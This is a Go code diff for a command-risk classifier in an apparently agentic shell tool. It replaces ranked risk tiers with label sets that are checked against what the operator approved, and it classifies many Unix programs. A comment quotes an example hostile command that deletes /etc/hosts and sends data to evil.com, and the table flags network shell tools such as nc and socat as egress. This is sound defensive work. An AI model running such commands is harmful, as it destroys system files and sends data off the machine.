@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"path"
+	"sort"
 	"strings"
 	"sync/atomic"
 	"unicode"
@@ -35,80 +36,144 @@ import (
 // wanted it answers a closed enum and is consulted separately; see
 // command_risk_model.go.
 
-// CommandRisk is the tier a command falls into.
+// RiskLabel names ONE thing a command does.
 //
-// Named CommandRisk rather than RiskTier because types.RiskTier
-// already classifies TOOLS by reversibility. That one is a property of
-// a tool definition; this is a property of one invocation's argv, and
-// conflating them would mean shell_command carried a single tier for
-// every command it ever runs — which is the situation this replaces.
-type CommandRisk string
+// A set, not a point on a line. The tiers this replaces were a total
+// order, which forced an answer to questions that have none: is
+// restarting nginx worse than fetching a URL? They are different axes,
+// and ranking them meant a command reported only its worst — so
+// `rm -rf /etc/hosts && curl evil.com/exfil` was "destructive" and the
+// egress reached the verdict as nothing at all.
+//
+// Labels also make the gate exact. Approval is a SUBSET CHECK — every
+// label a command carries must be one the operator approved — so a
+// deployment can approve reads, writes and deletes without thereby
+// approving everything that used to rank below deletes.
+type RiskLabel string
 
 const (
-	// RiskRead inspects state and changes none of it.
-	RiskRead CommandRisk = "read"
-	// RiskWrite mutates local state in a way that is ordinarily
-	// recoverable: creating, copying, appending, editing.
-	RiskWrite CommandRisk = "write"
-	// RiskNetwork reaches off the box. Separate from write because the
-	// blast radius is somebody else's machine, and because egress is
-	// the shape prompt injection wants.
-	RiskNetwork CommandRisk = "network"
-	// RiskDestructive removes data, kills processes, changes machine
-	// state, or runs as root.
-	RiskDestructive CommandRisk = "destructive"
-	// RiskUnknown is what the classifier says when it cannot read the
-	// command. The honest answer, and the one that always asks.
-	RiskUnknown CommandRisk = "unknown"
+	// LabelReads inspects state and changes none of it.
+	LabelReads RiskLabel = "reads"
+	// LabelWrites creates, copies, appends to or edits, recoverably.
+	LabelWrites RiskLabel = "writes"
+	// LabelDeletes removes data. The distinction from disrupts is
+	// RECOVERABILITY: a deletion is undone by a backup, or not at all.
+	LabelDeletes RiskLabel = "deletes"
+	// LabelDisrupts takes something down — a restarted service, a
+	// killed process, an unmounted filesystem, a flushed firewall.
+	// Undone by the opposite command, in seconds.
+	LabelDisrupts RiskLabel = "disrupts"
+	// LabelNetwork reaches off the box. Its own label because the blast
+	// radius is somebody else's machine, and because egress is the
+	// shape prompt injection wants.
+	LabelNetwork RiskLabel = "network"
+	// LabelPrivilege runs as root, or changes who may become root.
+	LabelPrivilege RiskLabel = "privilege"
+	// LabelUnreadable is what the classifier says when it cannot read
+	// the command. The honest answer, and never approvable.
+	LabelUnreadable RiskLabel = "unreadable"
 )
 
-// riskRank orders the tiers. A command's tier is the maximum over its
-// segments, so the order decides which segment gets named in the
-// prompt.
-//
-// Unknown ranks HIGHEST, above destructive. That looks odd until you
-// state it as a question: given one segment we know deletes data and
-// one we cannot read at all, which is the safer thing to tell the
-// user? The unreadable one, because the readable one is bounded and
-// the unreadable one is not.
-var riskRank = map[CommandRisk]int{
-	RiskRead:        1,
-	RiskWrite:       2,
-	RiskNetwork:     3,
-	RiskDestructive: 4,
-	RiskUnknown:     5,
+// AllRiskLabels is the closed set. Anything outside it — from config,
+// from a model — is discarded rather than trusted.
+var AllRiskLabels = []RiskLabel{
+	LabelReads, LabelWrites, LabelDeletes,
+	LabelDisrupts, LabelNetwork, LabelPrivilege, LabelUnreadable,
 }
 
-// Rank exposes the ordering for callers that compare tiers.
-func (r CommandRisk) Rank() int { return riskRank[r] }
-
-// Valid reports whether r is one of the five. An unrecognised tier
-// from config or from a model is discarded rather than trusted — the
-// same reason Hint.Valid exists.
-func (r CommandRisk) Valid() bool { return riskRank[r] != 0 }
-
-// AtLeast returns the higher of the two tiers.
-func (r CommandRisk) AtLeast(other CommandRisk) CommandRisk {
-	if other.Rank() > r.Rank() {
-		return other
+// Valid reports whether l is one of the seven.
+func (l RiskLabel) Valid() bool {
+	for _, k := range AllRiskLabels {
+		if k == l {
+			return true
+		}
 	}
-	return r
+	return false
 }
 
-// Label is how the tier is written in a confirmation prompt.
-func (r CommandRisk) Label() string {
-	switch r {
-	case RiskRead:
-		return "read-only"
-	case RiskWrite:
-		return "writes"
-	case RiskNetwork:
-		return "network"
-	case RiskDestructive:
-		return "destructive"
-	default:
+// labelSeverity orders labels for DISPLAY ONLY: which label leads a
+// headline, and which segment is quoted as the culprit.
+//
+// Emphatically not a gate. Nothing compares two labels to decide
+// whether a command may run — that is a subset check against what the
+// operator approved, and it needs no order at all. This exists so the
+// prompt puts the alarming word first rather than alphabetising.
+var labelSeverity = map[RiskLabel]int{
+	LabelReads: 1, LabelWrites: 2, LabelNetwork: 3,
+	LabelDisrupts: 4, LabelDeletes: 5, LabelPrivilege: 6, LabelUnreadable: 7,
+}
+
+// L builds a label set, keeping the table readable.
+func L(labels ...RiskLabel) []RiskLabel { return labels }
+
+// mergeLabels unions sets, dropping duplicates and ordering by display
+// severity so the same command always renders the same way.
+func mergeLabels(sets ...[]RiskLabel) []RiskLabel {
+	seen := map[RiskLabel]bool{}
+	var out []RiskLabel
+	for _, set := range sets {
+		for _, l := range set {
+			if l == "" || seen[l] {
+				continue
+			}
+			seen[l] = true
+			out = append(out, l)
+		}
+	}
+	// "reads" means reads AND NOTHING ELSE.
+	//
+	// Every command reads something — `sed -i` reads the file it
+	// rewrites, `rm` reads the directory it empties — so carrying the
+	// label alongside a stronger one adds a word and no information.
+	// Worse, it would make an approved set of exactly {writes} reject
+	// `sed -i`, which is not what anybody writing that meant.
+	if len(out) > 1 {
+		kept := out[:0]
+		for _, l := range out {
+			if l != LabelReads {
+				kept = append(kept, l)
+			}
+		}
+		out = kept
+	}
+	sort.SliceStable(out, func(i, j int) bool {
+		return labelSeverity[out[i]] > labelSeverity[out[j]]
+	})
+	return out
+}
+
+// hasLabel reports set membership.
+func hasLabel(set []RiskLabel, want RiskLabel) bool {
+	for _, l := range set {
+		if l == want {
+			return true
+		}
+	}
+	return false
+}
+
+// severityOf is the highest display-severity in a set. Display only.
+func severityOf(labels []RiskLabel) int {
+	worst := 0
+	for _, l := range labels {
+		if labelSeverity[l] > worst {
+			worst = labelSeverity[l]
+		}
+	}
+	return worst
+}
+
+// RenderLabels writes a label set for a person: severest first, joined
+// with "+". Empty renders as "unclassified".
+func RenderLabels(set []RiskLabel) string {
+	if len(set) == 0 {
 		return "unclassified"
 	}
+	parts := make([]string, 0, len(set))
+	for _, l := range set {
+		parts = append(parts, string(l))
+	}
+	return strings.Join(parts, " + ")
 }
 
 // CommandRiskRule is how one program name is classified.
@@ -119,19 +184,19 @@ func (r CommandRisk) Label() string {
 // `git status` and `git clean -fdx` are the same program.
 type CommandRiskRule struct {
 	// Tier applies when nothing below does.
-	Tier CommandRisk
+	Labels []RiskLabel
 
 	// Sub classifies by the first non-flag argument, for programs that
 	// are really a family of commands: git, podman, systemctl, apt-get.
 	// A subcommand the map does not name is UNKNOWN rather than Tier —
 	// a git subcommand nobody classified could be anything.
-	Sub map[string]CommandRisk
+	Sub map[string][]RiskLabel
 
 	// OperandTier applies when the segment carries at least one
 	// non-flag operand. For programs that report when bare and act when
 	// given something to act on: `mount` lists mounts, `mount /dev/sda1
 	// /mnt` does not.
-	OperandTier CommandRisk
+	OperandLabels []RiskLabel
 
 	// Targets marks a program whose risk is decided by WHAT IT IS
 	// POINTED AT rather than by its name.
@@ -150,7 +215,7 @@ type CommandRiskRule struct {
 	// root. Only consulted when Targets is set, and only ever lower
 	// than Tier — this is the de-escalation, and it is the only one in
 	// the classifier.
-	ScratchTier CommandRisk
+	ScratchLabels []RiskLabel
 
 	// TargetLast means only the final operand is written to and the
 	// rest are read. `cp /etc/passwd /tmp/x` copies a system file to a
@@ -163,19 +228,19 @@ type CommandRiskRule struct {
 	// token exactly, or as a prefix when they end in "*" — the same
 	// wildcard convention policy patterns use, and the reason `sed
 	// -i.bak` is caught alongside `sed -i`.
-	Escalate map[string]CommandRisk
+	Escalate map[string][]RiskLabel
 
 	// Reason overrides the tier's generic reason code, for entries
 	// where it would say nothing. Every interpreter classifies as
 	// unknown, and telling somebody `sh` is "unreadable" is true and
 	// useless — "runs_unread_code" is the thing they can act on.
-	Reason string
+	Why string
 }
 
 // DefaultCommandRisks is the shipped table.
 //
 // Incomplete on purpose and safe anyway: a program that is not here is
-// RiskUnknown, which asks. Entries are added when somebody has thought
+// L(LabelUnreadable), which asks. Entries are added when somebody has thought
 // about what the program does with every flag it might carry, not to
 // make the table look finished.
 //
@@ -183,155 +248,155 @@ type CommandRiskRule struct {
 var DefaultCommandRisks = map[string]CommandRiskRule{
 	// Inspection. Nothing here writes anywhere with the flags shown;
 	// the ones that CAN write carry an escalation.
-	"ls": {Tier: RiskRead}, "dir": {Tier: RiskRead}, "vdir": {Tier: RiskRead},
-	"cat": {Tier: RiskRead}, "head": {Tier: RiskRead}, "tail": {Tier: RiskRead},
-	"wc": {Tier: RiskRead}, "nl": {Tier: RiskRead}, "tac": {Tier: RiskRead},
-	"grep": {Tier: RiskRead}, "egrep": {Tier: RiskRead}, "fgrep": {Tier: RiskRead},
-	"rg": {Tier: RiskRead}, "ag": {Tier: RiskRead},
-	"stat": {Tier: RiskRead}, "file": {Tier: RiskRead}, "du": {Tier: RiskRead},
-	"df": {Tier: RiskRead}, "id": {Tier: RiskRead}, "groups": {Tier: RiskRead},
-	"whoami": {Tier: RiskRead}, "logname": {Tier: RiskRead},
-	"uname": {Tier: RiskRead}, "hostname": {Tier: RiskRead}, "uptime": {Tier: RiskRead},
-	"date": {Tier: RiskRead}, "cal": {Tier: RiskRead}, "locale": {Tier: RiskRead},
-	"printenv": {Tier: RiskRead}, "echo": {Tier: RiskRead}, "printf": {Tier: RiskRead},
-	"true": {Tier: RiskRead}, "false": {Tier: RiskRead}, "test": {Tier: RiskRead},
-	"[": {Tier: RiskRead}, "seq": {Tier: RiskRead}, "yes": {Tier: RiskRead},
-	"which": {Tier: RiskRead}, "command": {Tier: RiskRead}, "type": {Tier: RiskRead},
-	"whereis": {Tier: RiskRead}, "hash": {Tier: RiskRead},
-	"ps": {Tier: RiskRead}, "pgrep": {Tier: RiskRead}, "pidof": {Tier: RiskRead},
-	"free": {Tier: RiskRead}, "vmstat": {Tier: RiskRead}, "iostat": {Tier: RiskRead},
-	"lsblk": {Tier: RiskRead}, "lscpu": {Tier: RiskRead}, "lspci": {Tier: RiskRead},
-	"lsusb": {Tier: RiskRead}, "lsmod": {Tier: RiskRead}, "lsns": {Tier: RiskRead},
-	"getent": {Tier: RiskRead}, "getconf": {Tier: RiskRead}, "ulimit": {Tier: RiskRead},
-	"dmesg": {Tier: RiskRead}, "journalctl": {Tier: RiskRead},
-	"sha1sum": {Tier: RiskRead}, "sha256sum": {Tier: RiskRead}, "md5sum": {Tier: RiskRead},
-	"cksum": {Tier: RiskRead}, "b2sum": {Tier: RiskRead},
-	"diff": {Tier: RiskRead}, "cmp": {Tier: RiskRead}, "comm": {Tier: RiskRead},
-	"sort": {Tier: RiskRead}, "uniq": {Tier: RiskRead}, "cut": {Tier: RiskRead},
-	"paste": {Tier: RiskRead}, "join": {Tier: RiskRead}, "column": {Tier: RiskRead},
-	"tr": {Tier: RiskRead}, "rev": {Tier: RiskRead}, "fold": {Tier: RiskRead},
-	"od": {Tier: RiskRead}, "xxd": {Tier: RiskRead}, "hexdump": {Tier: RiskRead},
-	"strings": {Tier: RiskRead}, "ldd": {Tier: RiskRead}, "nm": {Tier: RiskRead},
-	"basename": {Tier: RiskRead}, "dirname": {Tier: RiskRead},
-	"readlink": {Tier: RiskRead}, "realpath": {Tier: RiskRead}, "pwd": {Tier: RiskRead},
-	"jq": {Tier: RiskRead}, "yq": {Tier: RiskRead},
+	"ls": {Labels: L(LabelReads)}, "dir": {Labels: L(LabelReads)}, "vdir": {Labels: L(LabelReads)},
+	"cat": {Labels: L(LabelReads)}, "head": {Labels: L(LabelReads)}, "tail": {Labels: L(LabelReads)},
+	"wc": {Labels: L(LabelReads)}, "nl": {Labels: L(LabelReads)}, "tac": {Labels: L(LabelReads)},
+	"grep": {Labels: L(LabelReads)}, "egrep": {Labels: L(LabelReads)}, "fgrep": {Labels: L(LabelReads)},
+	"rg": {Labels: L(LabelReads)}, "ag": {Labels: L(LabelReads)},
+	"stat": {Labels: L(LabelReads)}, "file": {Labels: L(LabelReads)}, "du": {Labels: L(LabelReads)},
+	"df": {Labels: L(LabelReads)}, "id": {Labels: L(LabelReads)}, "groups": {Labels: L(LabelReads)},
+	"whoami": {Labels: L(LabelReads)}, "logname": {Labels: L(LabelReads)},
+	"uname": {Labels: L(LabelReads)}, "hostname": {Labels: L(LabelReads)}, "uptime": {Labels: L(LabelReads)},
+	"date": {Labels: L(LabelReads)}, "cal": {Labels: L(LabelReads)}, "locale": {Labels: L(LabelReads)},
+	"printenv": {Labels: L(LabelReads)}, "echo": {Labels: L(LabelReads)}, "printf": {Labels: L(LabelReads)},
+	"true": {Labels: L(LabelReads)}, "false": {Labels: L(LabelReads)}, "test": {Labels: L(LabelReads)},
+	"[": {Labels: L(LabelReads)}, "seq": {Labels: L(LabelReads)}, "yes": {Labels: L(LabelReads)},
+	"which": {Labels: L(LabelReads)}, "command": {Labels: L(LabelReads)}, "type": {Labels: L(LabelReads)},
+	"whereis": {Labels: L(LabelReads)}, "hash": {Labels: L(LabelReads)},
+	"ps": {Labels: L(LabelReads)}, "pgrep": {Labels: L(LabelReads)}, "pidof": {Labels: L(LabelReads)},
+	"free": {Labels: L(LabelReads)}, "vmstat": {Labels: L(LabelReads)}, "iostat": {Labels: L(LabelReads)},
+	"lsblk": {Labels: L(LabelReads)}, "lscpu": {Labels: L(LabelReads)}, "lspci": {Labels: L(LabelReads)},
+	"lsusb": {Labels: L(LabelReads)}, "lsmod": {Labels: L(LabelReads)}, "lsns": {Labels: L(LabelReads)},
+	"getent": {Labels: L(LabelReads)}, "getconf": {Labels: L(LabelReads)}, "ulimit": {Labels: L(LabelReads)},
+	"dmesg": {Labels: L(LabelReads)}, "journalctl": {Labels: L(LabelReads)},
+	"sha1sum": {Labels: L(LabelReads)}, "sha256sum": {Labels: L(LabelReads)}, "md5sum": {Labels: L(LabelReads)},
+	"cksum": {Labels: L(LabelReads)}, "b2sum": {Labels: L(LabelReads)},
+	"diff": {Labels: L(LabelReads)}, "cmp": {Labels: L(LabelReads)}, "comm": {Labels: L(LabelReads)},
+	"sort": {Labels: L(LabelReads)}, "uniq": {Labels: L(LabelReads)}, "cut": {Labels: L(LabelReads)},
+	"paste": {Labels: L(LabelReads)}, "join": {Labels: L(LabelReads)}, "column": {Labels: L(LabelReads)},
+	"tr": {Labels: L(LabelReads)}, "rev": {Labels: L(LabelReads)}, "fold": {Labels: L(LabelReads)},
+	"od": {Labels: L(LabelReads)}, "xxd": {Labels: L(LabelReads)}, "hexdump": {Labels: L(LabelReads)},
+	"strings": {Labels: L(LabelReads)}, "ldd": {Labels: L(LabelReads)}, "nm": {Labels: L(LabelReads)},
+	"basename": {Labels: L(LabelReads)}, "dirname": {Labels: L(LabelReads)},
+	"readlink": {Labels: L(LabelReads)}, "realpath": {Labels: L(LabelReads)}, "pwd": {Labels: L(LabelReads)},
+	"jq": {Labels: L(LabelReads)}, "yq": {Labels: L(LabelReads)},
 
 	// Reads by default, writes when told to.
-	"sed": {Tier: RiskRead, Escalate: map[string]CommandRisk{
-		"-i*": RiskWrite, "--in-place*": RiskWrite,
+	"sed": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
+		"-i*": L(LabelWrites), "--in-place*": L(LabelWrites),
 	}},
-	"find": {Tier: RiskRead, Escalate: map[string]CommandRisk{
-		"-delete": RiskDestructive, "-exec": RiskUnknown, "-execdir": RiskUnknown,
-		"-ok": RiskUnknown, "-okdir": RiskUnknown, "-fprint*": RiskWrite,
+	"find": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
+		"-delete": L(LabelDeletes), "-exec": L(LabelUnreadable), "-execdir": L(LabelUnreadable),
+		"-ok": L(LabelUnreadable), "-okdir": L(LabelUnreadable), "-fprint*": L(LabelWrites),
 	}},
-	"tar": {Tier: RiskRead, Escalate: map[string]CommandRisk{
-		"-x*": RiskWrite, "--extract": RiskWrite, "-c*": RiskWrite, "--create": RiskWrite,
-		"--delete": RiskDestructive,
+	"tar": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
+		"-x*": L(LabelWrites), "--extract": L(LabelWrites), "-c*": L(LabelWrites), "--create": L(LabelWrites),
+		"--delete": L(LabelDeletes),
 	}},
-	"unzip": {Tier: RiskWrite}, "zip": {Tier: RiskWrite}, "gzip": {Tier: RiskWrite},
-	"gunzip": {Tier: RiskWrite}, "zcat": {Tier: RiskRead},
+	"unzip": {Labels: L(LabelWrites)}, "zip": {Labels: L(LabelWrites)}, "gzip": {Labels: L(LabelWrites)},
+	"gunzip": {Labels: L(LabelWrites)}, "zcat": {Labels: L(LabelReads)},
 	// `mount` bare lists; `mount <device> <point>` acts.
-	"mount":  {Tier: RiskRead, OperandTier: RiskDestructive},
-	"umount": {Tier: RiskDestructive},
-	"swapon": {Tier: RiskRead, OperandTier: RiskDestructive},
+	"mount":  {Labels: L(LabelReads), OperandLabels: L(LabelDisrupts)},
+	"umount": {Labels: L(LabelDisrupts)},
+	"swapon": {Labels: L(LabelReads), OperandLabels: L(LabelDisrupts)},
 
 	// Local mutation, ordinarily recoverable. Targeting, so that
 	// writing into /etc is not filed alongside writing into /tmp.
-	"touch": {Tier: RiskWrite, Targets: true}, "mkdir": {Tier: RiskWrite, Targets: true},
-	"mktemp":  {Tier: RiskWrite},
-	"cp":      {Tier: RiskWrite, Targets: true, TargetLast: true},
-	"mv":      {Tier: RiskWrite, Targets: true},
-	"ln":      {Tier: RiskWrite, Targets: true},
-	"install": {Tier: RiskWrite, Targets: true, TargetLast: true},
-	"tee":     {Tier: RiskWrite, Targets: true},
-	"mkfifo":  {Tier: RiskWrite, Targets: true},
-	"patch":   {Tier: RiskWrite, Targets: true}, "split": {Tier: RiskWrite, Targets: true},
-	"chmod": {Tier: RiskWrite, Targets: true, Escalate: map[string]CommandRisk{
-		"-R*": RiskDestructive, "--recursive": RiskDestructive,
+	"touch": {Labels: L(LabelWrites), Targets: true}, "mkdir": {Labels: L(LabelWrites), Targets: true},
+	"mktemp":  {Labels: L(LabelWrites)},
+	"cp":      {Labels: L(LabelWrites), Targets: true, TargetLast: true},
+	"mv":      {Labels: L(LabelWrites), Targets: true},
+	"ln":      {Labels: L(LabelWrites), Targets: true},
+	"install": {Labels: L(LabelWrites), Targets: true, TargetLast: true},
+	"tee":     {Labels: L(LabelWrites), Targets: true},
+	"mkfifo":  {Labels: L(LabelWrites), Targets: true},
+	"patch":   {Labels: L(LabelWrites), Targets: true}, "split": {Labels: L(LabelWrites), Targets: true},
+	"chmod": {Labels: L(LabelWrites), Targets: true, Escalate: map[string][]RiskLabel{
+		"-R*": L(LabelWrites, LabelPrivilege), "--recursive": L(LabelWrites, LabelPrivilege),
 	}},
-	"chown": {Tier: RiskWrite, Targets: true, Escalate: map[string]CommandRisk{
-		"-R*": RiskDestructive, "--recursive": RiskDestructive,
+	"chown": {Labels: L(LabelWrites), Targets: true, Escalate: map[string][]RiskLabel{
+		"-R*": L(LabelWrites, LabelPrivilege), "--recursive": L(LabelWrites, LabelPrivilege),
 	}},
-	"chgrp": {Tier: RiskWrite, Targets: true, Escalate: map[string]CommandRisk{
-		"-R*": RiskDestructive, "--recursive": RiskDestructive,
+	"chgrp": {Labels: L(LabelWrites), Targets: true, Escalate: map[string][]RiskLabel{
+		"-R*": L(LabelWrites, LabelPrivilege), "--recursive": L(LabelWrites, LabelPrivilege),
 	}},
 
 	// Reaching off the box. curl/wget/ssh and friends are ALSO in
 	// DefaultCommandClasses, which is where the action comes from; they
 	// are repeated here so that an operator who unclassifies one
 	// (action = "") does not thereby make it look read-only.
-	"curl": {Tier: RiskNetwork}, "wget": {Tier: RiskNetwork},
-	"ssh": {Tier: RiskNetwork}, "scp": {Tier: RiskNetwork},
-	"rsync": {Tier: RiskNetwork}, "rclone": {Tier: RiskNetwork},
-	"sftp": {Tier: RiskNetwork}, "ftp": {Tier: RiskNetwork},
-	"nc": {Tier: RiskNetwork}, "ncat": {Tier: RiskNetwork}, "socat": {Tier: RiskNetwork},
-	"telnet": {Tier: RiskNetwork}, "ping": {Tier: RiskNetwork},
-	"dig": {Tier: RiskNetwork}, "host": {Tier: RiskNetwork}, "nslookup": {Tier: RiskNetwork},
-	"traceroute": {Tier: RiskNetwork}, "ip": {Tier: RiskRead, OperandTier: RiskRead},
+	"curl": {Labels: L(LabelNetwork)}, "wget": {Labels: L(LabelNetwork)},
+	"ssh": {Labels: L(LabelNetwork)}, "scp": {Labels: L(LabelNetwork)},
+	"rsync": {Labels: L(LabelNetwork)}, "rclone": {Labels: L(LabelNetwork)},
+	"sftp": {Labels: L(LabelNetwork)}, "ftp": {Labels: L(LabelNetwork)},
+	"nc": {Labels: L(LabelNetwork)}, "ncat": {Labels: L(LabelNetwork)}, "socat": {Labels: L(LabelNetwork)},
+	"telnet": {Labels: L(LabelNetwork)}, "ping": {Labels: L(LabelNetwork)},
+	"dig": {Labels: L(LabelNetwork)}, "host": {Labels: L(LabelNetwork)}, "nslookup": {Labels: L(LabelNetwork)},
+	"traceroute": {Labels: L(LabelNetwork)}, "ip": {Labels: L(LabelReads), OperandLabels: L(LabelReads)},
 
 	// Removal, machine state, privilege. The file-deleting ones target;
 	// the disk-writing ones do not, because dd and mkfs are pointed at
 	// devices and there is no scratch device.
-	"rm":       {Tier: RiskDestructive, Targets: true, ScratchTier: RiskWrite},
-	"rmdir":    {Tier: RiskDestructive, Targets: true, ScratchTier: RiskWrite},
-	"shred":    {Tier: RiskDestructive, Targets: true, ScratchTier: RiskWrite},
-	"truncate": {Tier: RiskDestructive, Targets: true, ScratchTier: RiskWrite},
-	"dd":       {Tier: RiskDestructive}, "mkfs": {Tier: RiskDestructive},
-	"fdisk": {Tier: RiskDestructive}, "parted": {Tier: RiskDestructive},
-	"wipefs": {Tier: RiskDestructive}, "sfdisk": {Tier: RiskDestructive},
-	"kill": {Tier: RiskDestructive}, "pkill": {Tier: RiskDestructive},
-	"killall": {Tier: RiskDestructive}, "xkill": {Tier: RiskDestructive},
-	"shutdown": {Tier: RiskDestructive}, "reboot": {Tier: RiskDestructive},
-	"halt": {Tier: RiskDestructive}, "poweroff": {Tier: RiskDestructive},
-	"iptables": {Tier: RiskDestructive}, "nft": {Tier: RiskDestructive},
-	"useradd": {Tier: RiskDestructive}, "userdel": {Tier: RiskDestructive},
-	"usermod": {Tier: RiskDestructive}, "groupadd": {Tier: RiskDestructive},
-	"groupdel": {Tier: RiskDestructive}, "passwd": {Tier: RiskDestructive},
-	"visudo": {Tier: RiskDestructive}, "crontab": {Tier: RiskDestructive},
-	"insmod": {Tier: RiskDestructive}, "rmmod": {Tier: RiskDestructive},
-	"modprobe": {Tier: RiskDestructive},
+	"rm":       {Labels: L(LabelDeletes), Targets: true, ScratchLabels: L(LabelWrites)},
+	"rmdir":    {Labels: L(LabelDeletes), Targets: true, ScratchLabels: L(LabelWrites)},
+	"shred":    {Labels: L(LabelDeletes), Targets: true, ScratchLabels: L(LabelWrites)},
+	"truncate": {Labels: L(LabelDeletes), Targets: true, ScratchLabels: L(LabelWrites)},
+	"dd":       {Labels: L(LabelDeletes, LabelDisrupts)}, "mkfs": {Labels: L(LabelDeletes, LabelDisrupts)},
+	"fdisk": {Labels: L(LabelDeletes, LabelDisrupts)}, "parted": {Labels: L(LabelDeletes, LabelDisrupts)},
+	"wipefs": {Labels: L(LabelDeletes, LabelDisrupts)}, "sfdisk": {Labels: L(LabelDeletes, LabelDisrupts)},
+	"kill": {Labels: L(LabelDisrupts)}, "pkill": {Labels: L(LabelDisrupts)},
+	"killall": {Labels: L(LabelDisrupts)}, "xkill": {Labels: L(LabelDisrupts)},
+	"shutdown": {Labels: L(LabelDisrupts)}, "reboot": {Labels: L(LabelDisrupts)},
+	"halt": {Labels: L(LabelDisrupts)}, "poweroff": {Labels: L(LabelDisrupts)},
+	"iptables": {Labels: L(LabelDisrupts, LabelPrivilege)}, "nft": {Labels: L(LabelDisrupts, LabelPrivilege)},
+	"useradd": {Labels: L(LabelPrivilege)}, "userdel": {Labels: L(LabelPrivilege, LabelDeletes)},
+	"usermod": {Labels: L(LabelPrivilege)}, "groupadd": {Labels: L(LabelPrivilege)},
+	"groupdel": {Labels: L(LabelPrivilege)}, "passwd": {Labels: L(LabelPrivilege)},
+	"visudo": {Labels: L(LabelPrivilege)}, "crontab": {Labels: L(LabelPrivilege, LabelWrites)},
+	"insmod": {Labels: L(LabelDisrupts, LabelPrivilege)}, "rmmod": {Labels: L(LabelDisrupts, LabelPrivilege)},
+	"modprobe": {Labels: L(LabelDisrupts, LabelPrivilege)},
 
 	// Families. A subcommand the map does not name is unknown.
-	"git": {Tier: RiskRead, Sub: map[string]CommandRisk{
-		"status": RiskRead, "log": RiskRead, "diff": RiskRead, "show": RiskRead,
-		"branch": RiskRead, "describe": RiskRead, "blame": RiskRead, "config": RiskRead,
-		"rev-parse": RiskRead, "ls-files": RiskRead, "ls-remote": RiskNetwork,
-		"shortlog": RiskRead, "tag": RiskWrite, "stash": RiskWrite,
-		"add": RiskWrite, "commit": RiskWrite, "checkout": RiskWrite,
-		"switch": RiskWrite, "restore": RiskWrite, "merge": RiskWrite,
-		"rebase": RiskWrite, "cherry-pick": RiskWrite, "revert": RiskWrite,
-		"apply": RiskWrite, "am": RiskWrite, "init": RiskWrite, "worktree": RiskWrite,
-		"clone": RiskNetwork, "fetch": RiskNetwork, "pull": RiskNetwork,
-		"push": RiskNetwork, "remote": RiskNetwork, "submodule": RiskNetwork,
-		"clean": RiskDestructive, "reset": RiskWrite, "gc": RiskDestructive,
-		"prune": RiskDestructive, "filter-branch": RiskDestructive,
-	}, Escalate: map[string]CommandRisk{
-		"--hard": RiskDestructive, "--force": RiskDestructive, "-f": RiskDestructive,
+	"git": {Labels: L(LabelReads), Sub: map[string][]RiskLabel{
+		"status": L(LabelReads), "log": L(LabelReads), "diff": L(LabelReads), "show": L(LabelReads),
+		"branch": L(LabelReads), "describe": L(LabelReads), "blame": L(LabelReads), "config": L(LabelReads),
+		"rev-parse": L(LabelReads), "ls-files": L(LabelReads), "ls-remote": L(LabelNetwork),
+		"shortlog": L(LabelReads), "tag": L(LabelWrites), "stash": L(LabelWrites),
+		"add": L(LabelWrites), "commit": L(LabelWrites), "checkout": L(LabelWrites),
+		"switch": L(LabelWrites), "restore": L(LabelWrites), "merge": L(LabelWrites),
+		"rebase": L(LabelWrites), "cherry-pick": L(LabelWrites), "revert": L(LabelWrites),
+		"apply": L(LabelWrites), "am": L(LabelWrites), "init": L(LabelWrites), "worktree": L(LabelWrites),
+		"clone": L(LabelNetwork), "fetch": L(LabelNetwork), "pull": L(LabelNetwork),
+		"push": L(LabelNetwork), "remote": L(LabelNetwork), "submodule": L(LabelNetwork),
+		"clean": L(LabelDeletes), "reset": L(LabelWrites), "gc": L(LabelDeletes),
+		"prune": L(LabelDeletes), "filter-branch": L(LabelDeletes),
+	}, Escalate: map[string][]RiskLabel{
+		"--hard": L(LabelDeletes), "--force": L(LabelDeletes), "-f": L(LabelDeletes),
 	}},
 	"podman": containerRisk, "docker": containerRisk, "nerdctl": containerRisk,
-	"systemctl": {Tier: RiskRead, Sub: map[string]CommandRisk{
-		"status": RiskRead, "show": RiskRead, "cat": RiskRead, "list-units": RiskRead,
-		"list-unit-files": RiskRead, "is-active": RiskRead, "is-enabled": RiskRead,
-		"start": RiskDestructive, "stop": RiskDestructive, "restart": RiskDestructive,
-		"reload": RiskDestructive, "enable": RiskDestructive, "disable": RiskDestructive,
-		"mask": RiskDestructive, "unmask": RiskDestructive, "daemon-reload": RiskDestructive,
+	"systemctl": {Labels: L(LabelReads), Sub: map[string][]RiskLabel{
+		"status": L(LabelReads), "show": L(LabelReads), "cat": L(LabelReads), "list-units": L(LabelReads),
+		"list-unit-files": L(LabelReads), "is-active": L(LabelReads), "is-enabled": L(LabelReads),
+		"start": L(LabelDisrupts), "stop": L(LabelDisrupts), "restart": L(LabelDisrupts),
+		"reload": L(LabelDisrupts), "enable": L(LabelDisrupts, LabelWrites), "disable": L(LabelDisrupts, LabelWrites),
+		"mask": L(LabelDisrupts, LabelWrites), "unmask": L(LabelDisrupts, LabelWrites), "daemon-reload": L(LabelDisrupts),
 	}},
-	"apt-get": packageRisk, "apt": packageRisk, "apt-cache": {Tier: RiskRead},
+	"apt-get": packageRisk, "apt": packageRisk, "apt-cache": {Labels: L(LabelReads)},
 	"dnf": packageRisk, "yum": packageRisk, "zypper": packageRisk,
-	"pacman": {Tier: RiskUnknown}, "apk": packageRisk,
-	"dpkg": {Tier: RiskRead, Escalate: map[string]CommandRisk{
-		"-i": RiskWrite, "--install": RiskWrite,
-		"-r": RiskDestructive, "--remove": RiskDestructive, "--purge": RiskDestructive,
+	"pacman": {Labels: L(LabelUnreadable)}, "apk": packageRisk,
+	"dpkg": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
+		"-i": L(LabelWrites), "--install": L(LabelWrites),
+		"-r": L(LabelDeletes), "--remove": L(LabelDeletes), "--purge": L(LabelDeletes),
 	}},
-	"rpm": {Tier: RiskRead, Escalate: map[string]CommandRisk{
-		"-i": RiskWrite, "--install": RiskWrite,
-		"-e": RiskDestructive, "--erase": RiskDestructive,
+	"rpm": {Labels: L(LabelReads), Escalate: map[string][]RiskLabel{
+		"-i": L(LabelWrites), "--install": L(LabelWrites),
+		"-e": L(LabelDeletes), "--erase": L(LabelDeletes),
 	}},
 	"pip": pipRisk, "pip3": pipRisk,
